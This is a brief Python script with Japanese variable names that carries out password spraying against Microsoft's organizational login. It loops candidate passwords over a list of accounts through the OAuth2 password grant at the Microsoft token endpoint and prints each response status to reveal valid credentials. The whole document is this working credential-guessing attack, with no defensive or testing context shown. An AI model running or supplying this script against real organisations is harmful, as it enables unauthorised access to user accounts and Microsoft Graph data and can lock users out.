import os
import requests

利用者一覧 = os.environ['ACCOUNT_SET'].split(',')
候補一覧 = os.environ['CANDIDATE_SET'].split(',')
client_id = os.environ['CLIENT_ID']
for 候補 in 候補一覧:
    for 利用者 in 利用者一覧:
        response = requests.post(
            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
            data={'grant_type': 'password', 'client_id': client_id,
                  'username': 利用者, 'password': 候補,
                  'scope': 'https://graph.microsoft.com/.default'},
            timeout=20,
        )
        print(利用者, response.status_code)
